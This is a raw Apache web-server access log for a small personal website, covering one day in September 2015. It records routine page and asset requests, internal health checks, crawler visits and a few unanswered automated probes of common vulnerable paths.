14.139.240.50 - - [22/Sep/2015:00:38:49 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:00:38:50 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:00:38:52 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:00:38:50 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:00:38:56 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:00:39:01 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:00:39:49 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:00:39:49 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:00:39:49 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:00:39:53 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:00:39:50 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:00:40:41 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:00:41:57 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:00:41:57 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:00:43:08 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:00:43:08 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:00:43:08 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:00:43:08 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:01:04:33 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:01:04:33 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:01:04:33 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:01:04:34 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:01:22:34 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:01:22:35 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:01:22:35 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:01:22:35 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:01:23:30 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:36:19 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:56:13 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:56:14 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:56:18 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:57:58 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:01:58:00 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:02:05:07 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:02:05:26 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:02:17:29 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:02:17:29 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:02:17:29 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:02:17:30 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:02:17:30 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:02:23:19 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:04:10:41 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
46.172.71.251 - - [22/Sep/2015:04:25:32 +0530] "GET /rom-0 HTTP/1.1" 404 461 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.46.86.231 - - [22/Sep/2015:08:06:13 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"
193.46.86.231 - - [22/Sep/2015:08:06:13 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"
193.46.86.231 - - [22/Sep/2015:08:06:13 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"
193.46.86.231 - - [22/Sep/2015:08:06:13 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"
106.192.18.175 - - [22/Sep/2015:08:52:00 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:08:52:00 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:08:52:00 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:08:52:01 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:08:52:01 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.18.175 - - [22/Sep/2015:08:52:01 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.18.175 - - [22/Sep/2015:08:52:36 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.18.175 - - [22/Sep/2015:08:52:36 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
::1 - - [22/Sep/2015:09:51:09 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:09:56:26 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.219.37.29 - - [22/Sep/2015:09:57:38 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.219.37.29 - - [22/Sep/2015:09:57:44 +0530] "GET /css/style.css HTTP/1.1" 200 489 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.219.37.29 - - [22/Sep/2015:09:57:44 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
::1 - - [22/Sep/2015:09:57:53 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.219.37.29 - - [22/Sep/2015:09:57:53 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280739 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
::1 - - [22/Sep/2015:09:58:49 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.219.37.29 - - [22/Sep/2015:09:59:09 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.219.37.29 - - [22/Sep/2015:09:59:22 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.219.37.29 - - [22/Sep/2015:09:59:23 +0530] "GET /img/mainbg.png HTTP/1.1" 206 342 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.219.37.29 - - [22/Sep/2015:09:59:23 +0530] "GET /img/mainbg.png HTTP/1.1" 206 517742 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
93.115.97.179 - - [22/Sep/2015:10:10:00 +0530] "GET /CFIDE/administrator/ HTTP/1.1" 404 513 "-" "-"
::1 - - [22/Sep/2015:10:43:42 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:43 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:44 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:45 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:46 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:47 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:10:43:54 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.192.18.175 - - [22/Sep/2015:10:52:56 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:52:59 +0530] "GET / HTTP/1.1" 200 989 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:06 +0530] "GET /css/style.css HTTP/1.1" 200 489 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:10 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:17 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:12 +0530] "GET /img/mainbg.png HTTP/1.1" 200 374832 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:23 +0530] "GET /img/mainbg.png HTTP/1.1" 206 341 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:53:29 +0530] "GET /img/mainbg.png HTTP/1.1" 206 1261942 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
106.192.18.175 - - [22/Sep/2015:10:54:25 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Safari/537.36"
69.64.46.86 - - [22/Sep/2015:11:00:55 +0530] "GET /cgi-bin/rtpd.cgi HTTP/1.0" 404 477 "-" "-"
::1 - - [22/Sep/2015:11:13:53 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:16:03 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:19 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:20 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:22 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:23 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:24 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:25 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:26 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:27 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:28 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:29 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:30 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:31 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:32 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:33 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:28:34 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:11:40:54 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.192.18.175 - - [22/Sep/2015:11:51:07 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Safari/537.36 OPR/27.0.1698.89105"
106.192.18.175 - - [22/Sep/2015:11:51:07 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Safari/537.36 OPR/27.0.1698.89105"
106.192.18.175 - - [22/Sep/2015:11:51:09 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Safari/537.36 OPR/27.0.1698.89105"
106.192.18.175 - - [22/Sep/2015:11:51:11 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Linux; Android 5.0.2; YU5010 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Safari/537.36 OPR/27.0.1698.89105"
106.192.18.175 - - [22/Sep/2015:11:51:29 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:11:51:30 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:11:51:30 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:11:51:30 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
106.192.18.175 - - [22/Sep/2015:11:51:31 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.18.175 - - [22/Sep/2015:11:51:31 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
::1 - - [22/Sep/2015:12:14:34 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
192.99.107.184 - - [22/Sep/2015:12:15:08 +0530] "GET /robots.txt HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)"
192.99.107.184 - - [22/Sep/2015:12:15:09 +0530] "GET / HTTP/1.1" 200 934 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)"
::1 - - [22/Sep/2015:12:18:10 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:12:26:02 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:12:27:56 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:12:29:47 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
